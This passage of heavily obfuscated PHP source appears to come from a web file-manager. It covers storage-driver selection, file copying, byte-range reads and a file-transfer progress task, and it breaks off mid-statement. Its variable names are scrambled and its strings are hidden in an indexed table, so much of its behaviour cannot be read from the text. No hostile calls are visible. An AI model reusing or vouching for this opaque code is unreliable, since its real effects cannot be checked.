driverIsSame($«É™ ûº, $Óö²Âğª) { $÷Ê¯Èõ =& $_SERVER[®»±”ó²]; $ãœŸéÌ = $«É™ ûº->getType(); $Î³ıÓªú = $Óö²Âğª->getType(); if ($ãœŸéÌ != $Î³ıÓªú) { return !1; } if ($ãœŸéÌ == $÷Ê¯Èõ[838]) { return !0; } if ($ãœŸéÌ == $÷Ê¯Èõ[109]) { return !0; } if ($«É™ ûº->pathDriver == $Óö²Âğª->pathDriver) { return !0; } return !1; } public static function copyUpdate($Ï÷¼‘Ô£, $Ù„š‚ï¡) { $¦Ìé‚° =& $_SERVER[®»±”ó²]; if (!IO::exist($Ï÷¼‘Ô£)) { return !1; } if (!IO::exist($Ù„š‚ï¡)) { IO::mkdir($Ù„š‚ï¡); } $Áú©‚ç = array_to_keyvalue(self::listAllSimple($Ï÷¼‘Ô£), $¦Ìé‚°[87]); $—Ş€‰Ğ” = array_to_keyvalue(self::listAllSimple($Ù„š‚ï¡), $¦Ìé‚°[87]); $Ç­óœ = array(); $ï¬İêÔì = array(); foreach ($Áú©‚ç as $ş¢‘›Æü => $ÕÂÕ¨í) { if (isset($—Ş€‰Ğ”[$ş¢‘›Æü])) { if ($ÕÂÕ¨í[$¦Ìé‚°[78]] == 1) { continue; } if ($—Ş€‰Ğ”[$ş¢‘›Æü][$¦Ìé‚°[79]] == $ÕÂÕ¨í[$¦Ìé‚°[79]]) { continue; } } if ($ÕÂÕ¨í[$¦Ìé‚°[78]] == 1) { $ï¬İêÔì[] = $Ù„š‚ï¡ . $¦Ìé‚°[8] . trim($ş¢‘›Æü, $¦Ìé‚°[8]); continue; } $¶³ìÇ¨· = strstr(trim($ş¢‘›Æü, $¦Ìé‚°[8]), $¦Ìé‚°[8]) ? get_path_father($ş¢‘›Æü) : $¦Ìé‚°[12]; $Ç­óœ[] = array($¦Ìé‚°[1251] => $ÕÂÕ¨í[$¦Ìé‚°[89]], $¦Ìé‚°[1252] => rtrim($Ù„š‚ï¡, $¦Ìé‚°[8]) . $¦Ìé‚°[8] . $¶³ìÇ¨·, $¦Ìé‚°[1253] => $ÕÂÕ¨í); } $»´‰¶À… = array($¦Ìé‚°[233] => $Ç­óœ, $¦Ìé‚°[78] => $ï¬İêÔì); Hook::trigger($¦Ìé‚°[1254], $Ï÷¼‘Ô£, $Ù„š‚ï¡, $»´‰¶À…); foreach ($ï¬İêÔì as $ÕÂÕ¨í) { IO::mkdir($ÕÂÕ¨í); } foreach ($Ç­óœ as $ÕÂÕ¨í) { IO::copy($ÕÂÕ¨í[$¦Ìé‚°[1251]], $ÕÂÕ¨í[$¦Ìé‚°[1252]], REPEAT_REPLACE); } } public static function fileSubstr($¶î†Ëí, $Ÿú‘‚¢, $š’şªß = false) { $Íøø…–µ =& $_SERVER[®»±”ó²]; $äøÕ°¾Ç = self::driverMake($¶î†Ëí); $Ê¢Œïöã = $äøÕ°¾Ç->size($¶î†Ëí); $Åùâ‰Ã€ = $Ÿú‘‚¢; $¨ŠÖç = $š’şªß; if ($Ÿú‘‚¢ < 0) { $Ÿú‘‚¢ = $Ê¢Œïöã + $Ÿú‘‚¢; } if ($š’şªß === !1) { $š’şªß = $Ê¢Œïöã - $Ÿú‘‚¢; } if ($Ÿú‘‚¢ + $š’şªß > $Ê¢Œïöã) { $š’şªß = $Ê¢Œïöã - $Ÿú‘‚¢; } if (!$Ê¢Œïöã && $äøÕ°¾Ç->getType() == $Íøø…–µ[109] && !$äøÕ°¾Ç->exist($¶î†Ëí)) { $ëø›µ£ = get_path_this($¶î†Ëí); $óûóÂ­Ì = parse_url_query($ëø›µ£); if (is_array($óûóÂ­Ì) && isset($óûóÂ­Ì[$Íøø…–µ[32]])) { $ëø›µ£ = urldecode($óûóÂ­Ì[$Íøø…–µ[32]]); } throw new Exception($Íøø…–µ[1255] . LNG($Íøø…–µ[1256]) . $Íøø…–µ[1053] . clear_html($ëø›µ£) . $Íøø…–µ[12]); } if ($š’şªß <= 0) { return $Íøø…–µ[12]; } if ($Ÿú‘‚¢ < 0 || $Ÿú‘‚¢ >= $Ê¢Œïöã || $š’şªß > $GLOBALS[$Íøø…–µ[6]][$Íøø…–µ[92]][$Íøø…–µ[1257]]) { throw new Exception("\146\x69\x6c\145\122\145\x61\144\40\x65\162\162\x6f\x72\54\x6f\x76\x65\x72\40\x69\157\122\x65\x61\144\x4d\141\170\41\40\163\164\141\x72\x74\75{$Ÿú‘‚¢}\x3b\x6c\x65\156\x67\x74\150\x3d{$š’şªß}\x3b\x20\163\x69\172\145\x3d{$Ê¢Œïöã}\x3b"); } $§¤Î¤–ê = $äøÕ°¾Ç->fileSubstr($¶î†Ëí, $Ÿú‘‚¢, $š’şªß); if (!$§¤Î¤–ê && $š’şªß && isset($GLOBALS[$Íøø…–µ[1258]])) { throw new Exception($GLOBALS[$Íøø…–µ[1258]][$Íøø…–µ[1259]]); } return $§¤Î¤–ê; } private static function driverMake(&$èÈ‹Öüê) { $É³Å¾æã =& $_SERVER[®»±”ó²]; $ÊÓ¼ïúÔ = KodIO::parse($èÈ‹Öüê); if (!self::$driverListSystem) { $õªôÅŒ« = Model($É³Å¾æã[848])->driverListSystem(); self::$driverListSystem = array_to_keyvalue($õªôÅŒ«, $É³Å¾æã[477]); } if ($ÊÓ¼ïúÔ[$É³Å¾æã[33]] == KodIO::KOD_IO && !self::$driverListSystem[$ÊÓ¼ïúÔ[$É³Å¾æã[477]]]) { throw new Exception($É³Å¾æã[1260]); return !1; } $èÈ‹Öüê = $ÊÓ¼ïúÔ[$É³Å¾æã[1261]]; $ï€Ôòğ = self::driverGet($ÊÓ¼ïúÔ, $èÈ‹Öüê); return $ï€Ôòğ; } private static function driverGet($ÖúÔÜ»å, &$”øìæœ’) { $ë“²ØÏ =& $_SERVER[®»±”ó²]; $¹ğÌú¸ = $ÖúÔÜ»å[$ë“²ØÏ[1262]]; $„ûíáèà = $ÖúÔÜ»å[$ë“²ØÏ[477]]; switch ($ÖúÔÜ»å[$ë“²ØÏ[33]]) { case KodIO::KOD_IO: $û¯ãÍ–ø = self::$driverListSystem[$„ûíáèà]; break; case KodIO::KOD_SOURCE: $”øìæœ’ = $„ûíáèà . $”øìæœ’; $û¯ãÍ–ø = array($ë“²ØÏ[1263] => $ë“²ØÏ[1264], $ë“²ØÏ[6] => $ÖúÔÜ»å); $û¯ãÍ–ø[$ë“²ØÏ[6]][$ë“²ØÏ[1265]] = $ÖúÔÜ»å[$ë“²ØÏ[477]]; break; case KodIO::KOD_USER_DRIVER: if (!self::$driverListUser) { $ˆ­ã®ÊÇ = $GLOBALS[$ë“²ØÏ[1266]]; self::$driverListUser = array_to_keyvalue($ˆ­ã®ÊÇ, $ë“²ØÏ[477]); } $û¯ãÍ–ø = self::$driverListUser[$„ûíáèà]; break; case KodIO::KOD_SHARE_LINK: $û¯ãÍ–ø = array($ë“²ØÏ[1263] => $ë“²ØÏ[1267], $ë“²ØÏ[6] => $ÖúÔÜ»å); $Ÿßªƒ›Ç = Action($ë“²ØÏ[1268])->sharePathInfo($ÖúÔÜ»å[$ë“²ØÏ[87]]); $”øìæœ’ = $Ÿßªƒ›Ç[$ë“²ØÏ[194]]; if (!$Ÿßªƒ›Ç[$ë“²ØÏ[194]]) { $¡©úÓ¹ù = Model($ë“²ØÏ[680])->getInfo($Ÿßªƒ›Ç[$ë“²ØÏ[681]]); $”øìæœ’ = KodIO::clear($¡©úÓ¹ù[$ë“²ØÏ[1269]] . $ÖúÔÜ»å[$ë“²ØÏ[1261]]); $ÖúÔÜ»å[$ë“²ØÏ[573]] = $¡©úÓ¹ù; $ÖúÔÜ»å[$ë“²ØÏ[1242]] = $”øìæœ’; $û¯ãÍ–ø = array($ë“²ØÏ[1263] => $ë“²ØÏ[1270], $ë“²ØÏ[6] => $ÖúÔÜ»å); } else { $û¯ãÍ–ø[$ë“²ØÏ[6]][$ë“²ØÏ[1265]] = $Ÿßªƒ›Ç[$ë“²ØÏ[194]]; } break; case KodIO::KOD_SHARE_ITEM: $û¯ãÍ–ø = array($ë“²ØÏ[1263] => $ë“²ØÏ[1271], $ë“²ØÏ[6] => $ÖúÔÜ»å); $¡©úÓ¹ù = Model($ë“²ØÏ[680])->getInfo($ÖúÔÜ»å[$ë“²ØÏ[477]]); if ($¡©úÓ¹ù[$ë“²ØÏ[194]] == $ë“²ØÏ[231]) { $”øìæœ’ = KodIO::clear($¡©úÓ¹ù[$ë“²ØÏ[1269]] . $ÖúÔÜ»å[$ë“²ØÏ[1261]]); $ÖúÔÜ»å[$ë“²ØÏ[573]] = $¡©úÓ¹ù; $ÖúÔÜ»å[$ë“²ØÏ[1242]] = $”øìæœ’; $û¯ãÍ–ø = array($ë“²ØÏ[1263] => $ë“²ØÏ[1272], $ë“²ØÏ[6] => $ÖúÔÜ»å); } else { if (!$”øìæœ’) { $”øìæœ’ = $¡©úÓ¹ù[$ë“²ØÏ[194]]; } $û¯ãÍ–ø[$ë“²ØÏ[6]][$ë“²ØÏ[1265]] = $¡©úÓ¹ù[$ë“²ØÏ[194]]; } break; default: $”øìæœ’ = $ÖúÔÜ»å[$ë“²ØÏ[87]]; $û¯ãÍ–ø = array($ë“²ØÏ[1263] => $ë“²ØÏ[1273]); break; } $†ëÊÎç = $ÖúÔÜ»å[$ë“²ØÏ[87]]; if (!isset(self::$driverCache[$†ëÊÎç])) { $‘™£Ò”ê = strtolower($û¯ãÍ–ø[$ë“²ØÏ[98]]); $Â´¢¾ıÆ = $GLOBALS[$ë“²ØÏ[6]][$ë“²ØÏ[92]][$ë“²ØÏ[912]]; $Œ‰²Û‚ä = $ë“²ØÏ[77] . (isset($Â´¢¾ıÆ[$‘™£Ò”ê]) ? $Â´¢¾ıÆ[$‘™£Ò”ê] : ucfirst($‘™£Ò”ê)); if (!class_exists($Œ‰²Û‚ä)) { show_json("{$Œ‰²Û‚ä}\x20\156\157\164\x20\x65\170\x69\x73\x74\x73\41", !1); } $¦Ò±ğ°Š = isset($û¯ãÍ–ø[$ë“²ØÏ[6]]) ? $û¯ãÍ–ø[$ë“²ØÏ[6]] : !1; self::$driverCache[$†ëÊÎç] = new $Œ‰²Û‚ä($¦Ò±ğ°Š); } $”¸Îğ‰¤ = self::$driverCache[$†ëÊÎç]; $”¸Îğ‰¤->pathDriver = $¹ğÌú¸; $”¸Îğ‰¤->pathBase = $ë“²ØÏ[12]; if (isset($û¯ãÍ–ø[$ë“²ØÏ[6]][$ë“²ØÏ[1274]])) { $”¸Îğ‰¤->pathBase = rtrim($û¯ãÍ–ø[$ë“²ØÏ[6]][$ë“²ØÏ[1274]], $ë“²ØÏ[8]) . $ë“²ØÏ[8]; $”øìæœ’ = $”¸Îğ‰¤->pathBase . ltrim($”øìæœ’, $ë“²ØÏ[8]); } $”øìæœ’ = $”¸Îğ‰¤->getPath($”øìæœ’); if (isset($ÖúÔÜ»å[$ë“²ØÏ[1242]])) { $”øìæœ’ = $ÖúÔÜ»å[$ë“²ØÏ[1242]]; } $”¸Îğ‰¤->path = $”øìæœ’; return $”¸Îğ‰¤; } public static function errorTips($ÊÏø³õ¯ = false) { $Åî¨ãÑÊ =& $_SERVER[®»±”ó²]; static $¤§¬¤ü = array(); $ÈÍË¾ÉÈ = 1000; if ($ÊÏø³õ¯ === -1) { return $¤§¬¤ü ? $¤§¬¤ü[count($¤§¬¤ü) - 1] : $Åî¨ãÑÊ[12]; } if ($ÊÏø³õ¯ === !1) { return implode($Åî¨ãÑÊ[288], $¤§¬¤ü); } if (count($¤§¬¤ü) >= $ÈÍË¾ÉÈ) { $¤§¬¤ü = array_slice($¤§¬¤ü, $ÈÍË¾ÉÈ * 0.5, $ÈÍË¾ÉÈ); } $¤§¬¤ü[] = $ÊÏø³õ¯; write_log($Åî¨ãÑÊ[176] . ACTION . $Åî¨ãÑÊ[1275] . $ÊÏø³õ¯, $Åî¨ãÑÊ[1276]); } public static function getLastError($öãñËÑ = '') { $Åï²ııï = self::errorTips(-1); return $Åï²ııï ? $Åï²ııï : $öãñËÑ; } } goto DÕšÅâº—“; d ÏÕË…„“: class TaskFileTransfer extends Task { protected function startAfter() { $Ú’Æ¨±í =& $_SERVER[®»±”ó²]; $æğ»Ã©§ =& $this->task; $this->sourceCopyFolder = !1; Hook::bind($Ú’Æ¨±í[1822], array($this, $Ú’Æ¨±í[1823])); Hook::bind($Ú’Æ¨±í[1320], array($this, $Ú’Æ¨±í[1824])); Hook::bind($Ú’Æ¨±í[1825], array($this, $Ú’Æ¨±í[1826])); Hook::bind($Ú’Æ¨±í[684], array($this, $Ú’Æ¨±í[1827])); Hook::bind($Ú’Æ¨±í[685], array($this, $Ú’Æ¨±í[1828])); Hook::bind($Ú’Æ¨±í[691], array($this, $Ú’Æ¨±í[1829])); Hook::bind($Ú’Æ¨±í[692], array($this, $Ú’Æ¨±í[1830])); Hook::bind($Ú’Æ¨±í[687], array($this, $Ú’Æ¨±í[1831])); Hook::bind($Ú’Æ¨±í[689], array($this, $Ú’Æ¨±í[1832])); Hook::bind($Ú’Æ¨±í[653], array($this, $Ú’Æ¨±í[1833])); Hook::bind($Ú’Æ¨±í[650], array($this, $Ú’Æ¨±í[1833])); Hook::bind($Ú’Æ¨±í[655], array($this, $Ú’Æ¨±í[1833])); Hook::bind($Ú’Æ¨±í[657], array($this, $Ú’Æ¨±í[1833])); Hook::bind($Ú’Æ¨±í[659], array($this, $Ú’Æ¨±í[1833])); Hook::bind($Ú’Æ¨±í[1834], array($this, $Ú’Æ¨±í[1835])); Hook::bind($Ú’Æ¨±í[675], array($this, $Ú’Æ¨±í[1836])); $this->sourceModelCopyFlag = !1; Hook::bind($Ú’Æ¨±í[1837], array($this, $Ú’Æ¨±í[1838])); Hook::bind($Ú’Æ¨±í[1839], array($this, $Ú’Æ¨±í[1840])); Hook::bind($Ú’Æ¨±í[1841], array($this, $Ú’Æ¨±í[1842])); $æğ»Ã©§[$Ú’Æ¨±í[1843]] = LNG($Ú’Æ¨±í[1844]); $æğ»Ã©§[$Ú’Æ¨±í[1845]] = 0; $æğ»Ã©§[$Ú’Æ¨±í[1846]] = 0; $æğ»Ã©§[$Ú’Æ¨±í[1152]] = $Ú’Æ¨±í[12]; $æğ»Ã©§[$Ú’Æ¨±í[1847]] = $Ú’Æ¨±í[12]; $æğ»Ã©§[$Ú’Æ¨±í[1848]] = 0; $æğ»Ã©§[$Ú’Æ¨±í[1849]] = 0; $æğ»Ã©§[$Ú’Æ¨±í[1850]] = 0; if (!$æğ»Ã©§[$Ú’Æ¨±í[1678]]) { $æğ»Ã©§[$Ú’Æ¨±í[1678]] = LNG($Ú’Æ¨±í[1851]); } } protected function endAfter() { $³Ä õÒ÷ =& $_SERVER[®»±”ó²]; Hook::unbind($³Ä õÒ÷[1822], array($this, $³Ä õÒ÷[1823])); Hook::unbind($³Ä õÒ÷[1320], array($this, $³Ä õÒ÷[1824])); Hook::unbind($³Ä õÒ÷[1825], array($this, $³Ä õÒ÷[1826])); Hook::unbind($³Ä õÒ÷[684], array($this, $³Ä õÒ÷[1827])); Hook::unbind($³Ä õÒ÷[685], array($this, $³Ä õÒ÷[1828])); Hook::unbind($³Ä õÒ÷[691], array($this, $³Ä õÒ÷[1829])); Hook::unbind($³Ä õÒ÷[692], array($this, $³Ä õÒ÷[1830])); Hook::unbind($³Ä õÒ÷[687], array($this, $³Ä õÒ÷[1831])); Hook::unbind($³Ä õÒ÷[689], array($this, $³Ä õÒ÷[1832])); Hook::unbind($³Ä õÒ÷[653], array($this, $³Ä õÒ÷[1833])); Hook::unbind($³Ä õÒ÷[650], array($this, $³Ä õÒ÷[1833])); Hook::unbind($³Ä õÒ÷[655], array($this, $³Ä õÒ÷[1833])); Hook::unbind($³Ä õÒ÷[657], array($this, $³Ä õÒ÷[1833])); Hook::unbind($³Ä õÒ÷[659], array($this, $³Ä õÒ÷[1833])); Hook::unbind($³Ä õÒ÷[1834], array($this, $³Ä õÒ÷[1835])); Hook::unbind($³Ä õÒ÷[675], array($this, $³Ä õÒ÷[1836])); Hook::unbind($³Ä õÒ÷[1837], array($this, $³Ä õÒ÷[1838])); Hook::unbind($³Ä õÒ÷[1839], array($this, $³Ä õÒ÷[1840])); Hook::unbind($³Ä õÒ÷[1841], array($this, $³Ä õÒ÷[1842])); } public function copyMoveStart($˜çü¦®¶, $¾ÕÅõÌ, $êâÏí±°, $õÄ˜å™Å) { $Ã¡¿Ú° =& $_SERVER[®»±”ó²]; self::log($Ã¡¿Ú°[1852] . $¾ÕÅõÌ . $Ã¡¿Ú°[73] . $õÄ˜å™Å); $ı¬Ï”‹ = rtrim(TEMP_FILES, $Ã¡¿Ú°[8]); if (substr($¾ÕÅõÌ, 0, strlen($ı¬Ï”‹)) == $ı¬Ï”‹) { return; } if (substr($õÄ˜å™Å, 0, strlen($ı¬Ï”‹)) == $ı¬Ï”‹) { return; } $¨Íä¸Ó— =& $this->task; $¨Íä¸Ó—[$Ã¡¿Ú°[1853]] = KodIO::transferType($˜çü¦®¶, $êâÏí±°); $this->update(); } public function updateAfter() { $üÃ€õª‘ =& $_SERVER[®»±”ó²]; $Ù”‚”à© =& $this->task; if (!$Ù”‚”à©[$üÃ€õª‘[844]]) { return; } if ($this->sourceModelCopyFlag) { return; } if ($Ù”‚”à©[$üÃ€õª‘[1853]] == $üÃ€õª‘[1421]) { return; } self::updateTask($Ù”‚”à©); } private static function updateTask(&$¬‰Ã’Óú) { $«Æ«¦ú =& $_SERVER[®»±”ó²]; if ($¬‰Ã’Óú[$«Æ«¦ú[1853]] == $«Æ«¦ú[1291] || $¬‰Ã’Óú[$«Æ«¦ú[1853]] == $«Æ«¦ú[110]) { if ($¬‰Ã’Óú[$«Æ«¦ú[1847]]) { $¬‰Ã’Óú[$«Æ«¦ú[1850]] = $¬‰Ã’Óú[$«Æ«¦ú[1849]] + $¬‰Ã’Óú[$«Æ«¦ú[1846]]; } } else { if ($¬‰Ã’Óú[$«Æ«¦ú[1853]] == $«Æ«¦ú[1422]) { if ($¬‰Ã’Óú[$«Æ«¦ú[1847]] == $«Æ«¦ú[1291]) { $¬‰Ã’Óú[$«Æ«¦ú[1850]] = $¬‰Ã’Óú[$«Æ«¦ú[1849]] + $¬‰Ã’Óú[$«Æ«¦ú[1846]] * 0.5; } else { if ($¬‰Ã’Óú[$«Æ«¦ú[1847]] == $«Æ«¦ú[110]) { $¬‰Ã’Óú[$«Æ«¦ú[1850]] = $¬‰Ã’Óú[$«Æ«¦ú[1849]] + $¬‰Ã’Óú[$«Æ«¦ú[1845]] * 0.5 + $¬‰Ã’Óú[$«Æ«¦ú[1846]] * 0.5; } } } } $¬‰Ã’Óú[$«Æ«¦ú[1793]] = $¬‰Ã’Óú[$«Æ«¦ú[1850]] / $¬‰Ã’Óú[$«Æ«¦ú[844]]; if ($¬‰Ã’Óú[$«Æ«¦ú[1793]] > 0) { $êÛşØÎõ = timeFloat() - $¬‰Ã’Óú[$«Æ«¦ú[1795]] - $¬‰Ã’Óú[$«Æ«¦ú[1798]]; $¬‰Ã’Óú[$«Æ«¦ú[1799]] = $êÛşØÎõ * (1 - $¬‰Ã’Óú[$«Æ«¦ú[1793]]) / $¬‰Ã’Óú[$«Æ«¦ú[1793]]; } } public function addPath($ö›˜‰ö¨) { $•¦ÆÌ =& $_SERVER[®»±”ó²]; if (!$ö›˜‰ö¨) { return; } $“Œ½¾Çù =& $this->task; $Ä˜†îë® = IO::infoWithChildren($ö›˜‰ö¨); $ÂáÊ²½¯ = $“Œ½¾Çù[$•¦ÆÌ[1854]] ? $“Œ½¾Çù[$•¦ÆÌ[1854]][$•¦ÆÌ[1855]] : 0; $“Œ½¾Çù[$•¦ÆÌ[1854]] = array($•¦ÆÌ[1855] => $ÂáÊ²½¯ + 1, $•¦ÆÌ[505] => $Ä˜†îë®[$•¦ÆÌ[32]], $•¦ÆÌ[87] => $Ä˜†îë®[$•¦ÆÌ[87]], $•¦ÆÌ[595] => $Ä˜†îë®[$•¦ÆÌ[595]] ? $Ä˜†îë®[$•¦ÆÌ[595]] : $Ä˜†îë®[$•¦ÆÌ[87]]); if ($Ä˜†îë®[$•¦ÆÌ[33]] == $•¦ÆÌ[233]) { $“Œ½¾Çù[$•¦ÆÌ[1150]] += 1; } else { $“Œ½¾Çù[$•¦ÆÌ[1150]] += $Ä˜†îë®[$•¦ÆÌ[82]][$•¦ÆÌ[80]]; if ($Ä˜†îë®[$•¦ÆÌ[194]]) { $“Œ½¾Çù[$•¦ÆÌ[1150]] += $Ä˜†îë®[$•¦ÆÌ[82]][$•¦ÆÌ[81]] + 1; } } $“Œ½¾Çù[$•¦ÆÌ[844]] += $Ä˜†îë®[$•¦ÆÌ[79]]; $this->update(); } public function sourceCopyFolderStart() { $this->sourceCopyFolder = !0; } public function sourceCopyFolderEnd() { $this->sourceCopyFolder = !1; } public function sourceAddHashStart($Ì¹ìÅ¹®) { } public function sourceAddHashEnd($ÖóèÂ‹) { } public function sourceAddFileStart($ô»Á™°í) { $Û¨Ø²Ï‚ =& $_SERVER[®»±”ó²]; $Ã¥©é—Ş =& $this->task; $Ã¥©é—Ş[$Û¨Ø²Ï‚[1845]] = $ô»Á™°í[$Û¨Ø²Ï‚[79]]; $Ã¥©é—Ş[$Û¨Ø²Ï‚[1843]] = $ô»Á™°í[$Û¨Ø²Ï‚[32]]; $Ã¥©é—Ş[$Û¨Ø²Ï‚[1152]] = $ô»Á™°í[$Û¨Ø²Ï‚[32]]; $Ã¥©é—Ş[$Û¨Ø²Ï‚[1856]] = $ô»Á™°í[$Û¨Ø²Ï‚[87]]; $this->update(); } public function sourceAddFileEnd($İ  ¶ë) { $äÔàî…÷ =& $_SERVER[®»±”ó²]; $øâÉ”…‡ =& $this->task; $øâÉ”…‡[$äÔàî…÷[1850]] += $İ  ¶ë[$äÔàî…÷[79]]; $øâÉ”…‡[$äÔàî…÷[1856]] = $İ  ¶ë[$äÔàî…÷[87]]; $this->update(1); } public function copyFileStart($óÕ °¶°, $Œ€È¥Ñ®, $Ş›·èóÏ, $¼õ”“Æ, $øºÈ™Î±, $ÜÑ¹ ÔÎ) { $êÂ±ŞË‡ =& $_SERVER[®»±”ó²]; $õ ›É€ = $øºÈ™Î±; if ($õ ›É€ == $GLOBALS[$êÂ±ŞË‡[1857]]) { $õ ›É€ = $GLOBALS[$êÂ±ŞË‡[1858]]; } $GLOBALS[$êÂ±ŞË‡[1858]] = $øºÈ™Î±; $GLOBALS[$êÂ±ŞË‡[1857]] = $ÜÑ¹ ÔÎ; $šÈ‡ò–É =& $this->task; $šÈ‡ò–É[$êÂ±ŞË‡[1843]] = $õ ›É€; $šÈ‡ò–É[$êÂ±ŞË‡[1845]] = (int) $óÕ °¶°->size($Œ€È¥Ñ®); $šÈ‡ò–É[$êÂ±ŞË‡[1846]] = 0; $šÈ‡ò–É[$êÂ±ŞË‡[1152]] = $êÂ±ŞË‡[12]; $šÈ‡ò–É[$êÂ±ŞË‡[1847]] = $êÂ±ŞË‡[12]; $šÈ‡ò–É[$êÂ±ŞË‡[1848]] = 0; $º©´ğïê = $šÈ‡ò–É[$êÂ±ŞË‡[1845]] > 1024 * 1024 * 10 ? !0 : !1; Cache::remove($šÈ‡ò–É[$êÂ±ŞË‡[477]] . $êÂ±ŞË‡[1859]); if ($º©´ğïê && file_exists(get_path_father($¼õ”“Æ))) { Cache::set($šÈ‡ò–É[$êÂ±ŞË‡[477]] . $êÂ±ŞË‡[1859], $¼õ”“Æ); $šÈ‡ò–É[$êÂ±ŞË‡[1816]] = array($êÂ±ŞË‡[1860], $êÂ±ŞË‡[1861]); } $this->update(0, $º©´ğïê); } public static function updateCopyLocalFileSize($¹†·„Ôˆ) { $“Ğ©‹Òá =& $_SERVER[®»±”ó²]; $Î‡¦¾ğ = Cache::get($¹†·„Ôˆ[$“Ğ©‹Òá[477]] . $“Ğ©‹Òá[1859]); if (!$Î‡¦¾ğ || !file_exists($Î‡¦¾ğ)) { return $¹†·„Ôˆ; } $¹†·„Ôˆ[$“Ğ©‹Òá[1846]] = @filesize($Î‡¦¾ğ); $¹†·„Ôˆ[$“Ğ©‹Òá[1850]] += $¹†·„Ôˆ[$“Ğ©‹Òá[1846]]; self::updateTask($¹†·„Ôˆ); return $¹†·„Ôˆ; } public function copyFileEnd($¼œÏÑâù, $ïİòç«ä, $ı¸ÎÒİ‡, $²¾Õ‹÷, $ËØÜóì, $Ù­ØÍµÃ) { $ŒñºÄ”Ä =& $_SERVER[®»±”ó²]; $¬Ûºí¤ =& $this->task; $¬Ûºí¤[$ŒñºÄ”Ä[1846]] = $¬Ûºí¤[$ŒñºÄ”Ä[1845]]; $¬Ûºí¤[$ŒñºÄ”Ä[1847]] = $ŒñºÄ”Ä[12]; unset($¬Ûºí¤[$ŒñºÄ”Ä[1816]]); if ($ËØÜóì == $¬Ûºí¤[$ŒñºÄ”Ä[1843]]) { $¬Ûºí¤[$ŒñºÄ”Ä[1849]] += $¬Ûºí¤[$ŒñºÄ”Ä[1845]]; $¬Ûºí¤[$ŒñºÄ”Ä[1850]] = $¬Ûºí¤[$ŒñºÄ”Ä[1849]]; $’ã³ŠÚ = 1; if (isset($¬Ûºí¤[$ŒñºÄ”Ä[1856]]) && $¬Ûºí¤[$ŒñºÄ”Ä[1856]] == $ïİòç«ä) { $’ã³ŠÚ = 0; } $this->update($’ã³ŠÚ); } else { $this->update(); $¬Ûºí¤[$ŒñºÄ”Ä[1846]] = 0; } Cache::remove($¬Ûºí¤[$ŒñºÄ”Ä[477]] . $ŒñºÄ”Ä[1859]); self::log($ŒñºÄ”Ä[1862] . $ïİòç«ä . $ŒñºÄ”Ä[73] . $²¾Õ‹÷ . $ŒñºÄ”Ä[288] . $ËØÜóì . $ŒñºÄ”Ä[1863] . $¬Ûºí¤[$ŒñºÄ”Ä[1843]]); } public function updateFileEnd($™Ä¢íƒ, $çÆ˜ñ² ) { $Ô¯œ½Ä =& $_SERVER[®»±”ó²]; $¶Š¹ĞĞ =& $this->task; $¶Š¹ĞĞ[$Ô¯œ½Ä[1843]] = $™Ä¢íƒ; $¶Š¹ĞĞ[$Ô¯œ½Ä[1845]] = $çÆ˜ñ² ; $¶Š¹ĞĞ[$Ô¯œ½Ä[1849]] += $çÆ˜ñ² ; $¶Š¹ĞĞ[$Ô¯œ½Ä[1850]] = $¶Š¹ĞĞ[$Ô¯œ½Ä[1849]]; $this->update(1); self::log($Ô¯œ½Ä[1864] . $™Ä¢íƒ); } public function sourceModelCopy($Äƒ…ÒÁÒ) { $¸ğª½¼ =& $_SERVER[®»±”ó²]; $Ù™÷ã½® = $Äƒ…ÒÁÒ[0]; $—¦ô¥ = $Äƒ…ÒÁÒ[1]; $´†ºôõå =& $this->task; $this->sourceModelCopyFlag = !0; $ÑëÍÙ–‡ = 0; switch ($Ù™÷ã½®) { case $¸ğª½¼[651]: $ÑëÍÙ–‡ = 1; break; case $¸ğª½¼[654]: $´†ºôõå[$¸ğª½¼[1843]] = $—¦ô¥[$¸ğª½¼[32]]; break; case $¸ğª½¼[656]: $ÑëÍÙ–‡ = intval($Äƒ…ÒÁÒ[$¸ğª½¼[458]] * 0.4); break; case $¸ğª½¼[658]: $ÑëÍÙ–‡ = intval($Äƒ…ÒÁÒ[$¸ğª½¼[458]] * 0.2); break; case $¸ğª½¼[660]: $ÑëÍÙ–‡ = intval($Äƒ…ÒÁÒ[$¸ğª½¼[458]] * 0.4); break; } $this->update($ÑëÍÙ–‡); $this->sourceModelCopyFlag = !1; } public function sourceRemove($âú¢…¸¥, $ùÚó¼Í) { $À™†µ¦™ =& $_SERVER[®»±”ó²]; $this->sourceModelCopyFlag = !0; $¿‚‘Ã = 1; if (isset($âú¢…¸¥[$À™†µ¦™[82]])) { $¿‚‘Ã = $âú¢…¸¥[$À™†µ¦™[82]][$À™†µ¦™[80]]; $¿‚‘Ã = $¿‚‘Ã + $âú¢…¸¥[$À™†µ¦™[82]][$À™†µ¦™[81]] + 1; } $this->update($¿‚‘Ã); $this->sourceModelCopyFlag = !1; } public function sourceMove($ää¥Áêæ) { $this->sourceRemove($ää¥Áêæ, !1); } public function curlProgress($ì³ëß², $¾íŸØ–¯, $ÌÁº×®, $à¢‰çÅ¯, $‚ÅƒùÊÛ) { $’ñæ­Ïî =& $_SERVER[®»±”ó²]; $ãíÎ«Å’ =& $this->task; if ($‚ÅƒùÊÛ > 0) { $ãíÎ«Å’[$’ñæ­Ïî[1152]] = $’ñæ­Ïî[1865]; $ãíÎ«Å’[$’ñæ­Ïî[1847]] = $’ñæ­Ïî[110]; if ($ãíÎ«Å’[$’ñæ­Ïî[1845]]) { $ãíÎ«Å’[$’ñæ­Ïî[1846]] = $‚ÅƒùÊÛ; } if ($ãíÎ«Å’[$’ñæ­Ïî[1848]]) { $ãíÎ«Å’[$’ñæ­Ïî[1846]] = $‚ÅƒùÊÛ + $ãíÎ«Å’[$’ñæ­Ïî[1848]]; } } else { if ($ÌÁº×® > 0) { if ($ãíÎ«Å’[$’ñæ­Ïî[1845]] == $¾íŸØ–¯) { $ãíÎ«Å’[$’ñæ­Ïî[1846]] = $ÌÁº×®; $ãíÎ«Å’[$’ñæ­Ïî[1152]] = $’ñæ­Ïî[1866]; $ãíÎ«Å’[$’ñæ­Ïî[1847]] = $’ñæ­Ïî[1291]; } } } $this->update(); } public function curlProgressStart($ÍõÈ¤„) { } public function curlProgressEnd($©…ê®§²) { $ àİè =& $_SERVER[®»±”ó²]; $šÄ½¦ Ÿ =& $this->task; $Œª‚¸Ú¡ = curl_getinfo($©…ê®§²); $ß†³­ƒ = $Œª‚¸Ú¡[$ àİè[1867]]; if ($ß†³­ƒ == -1) { $ß†³­ƒ = $Œª‚¸Ú¡[$ àİè[1868]]; } if 